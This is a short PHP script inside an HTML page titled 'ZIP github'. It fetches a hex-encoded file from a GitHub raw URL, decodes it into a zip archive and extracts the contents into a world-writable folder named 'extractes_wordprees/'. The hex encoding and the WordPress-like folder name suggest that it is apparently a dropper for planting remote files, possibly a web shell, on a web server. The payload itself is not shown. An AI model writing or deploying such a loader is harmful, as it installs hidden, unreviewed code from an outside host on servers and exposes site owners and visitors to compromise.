<!DOCTYPE html>
<html>
<head>
    <title>ZIP github</title>
</head>
<body>
    <?php
    
    $githubUrl = 'https://raw.githubusercontent.com/youngkmd/youngkmd/main/yami.txt';
    
    $localHexFile = 'hexfile.txt';

    
    $hexData = file_get_contents($githubUrl);
    if ($hexData === false) {
        echo "error";
    } else {
        
        file_put_contents($localHexFile, $hexData);

        
        $hexData = file_get_contents($localHexFile);
        if ($hexData === false) {
            echo "error";
        } else {
            
            $hexData = preg_replace('/[^0-9a-fA-F]/', '', $hexData);

            
            if (strlen($hexData) % 2 != 0) {
                echo "222";
            } else {
               
                $binaryData = hex2bin($hexData);

                if ($binaryData === false) {
                    echo "error to unhex";
                } else {
                    
                    $zipFilePath = 'temp.zip';
                    file_put_contents($zipFilePath, $binaryData);

                    
                    $zip = new ZipArchive;
                    if ($zip->open($zipFilePath) === TRUE) {
                        
                        $extractPath = 'extractes_wordprees/';
                        if (!is_dir($extractPath)) {
                            mkdir($extractPath, 0777, true);
                        }
                        $zip->extractTo($extractPath);
                        $zip->close();
                        echo "unziped: $extractPath";
                    } else {
                        echo "error to open ZIP.";
                    }

                    
                    unlink($zipFilePath);
                }
            }
        }
    }
    ?>
</body>
</html>
